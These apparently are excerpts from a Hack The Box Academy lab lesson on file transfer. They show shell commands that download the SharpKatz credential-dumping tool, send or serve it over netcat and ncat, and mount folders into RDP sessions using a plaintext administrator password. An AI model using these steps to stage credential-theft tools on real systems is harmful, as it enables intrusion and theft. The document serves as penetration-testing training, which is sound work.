...
```shell-session
JackTheWizard@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
JackTheWizard@htb[/htb]$ # Example using Original Netcat
JackTheWizard@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell-session
JackTheWizard@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
JackTheWizard@htb[/htb]$ # Example using Ncat
JackTheWizard@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
...
```shell-session
JackTheWizard@htb[/htb]$ # Example using Original Netcat
JackTheWizard@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
...
```shell-session
JackTheWizard@htb[/htb]$ # Example using Ncat
JackTheWizard@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
...
```shell-session
JackTheWizard@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
...
```shell-session
JackTheWizard@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
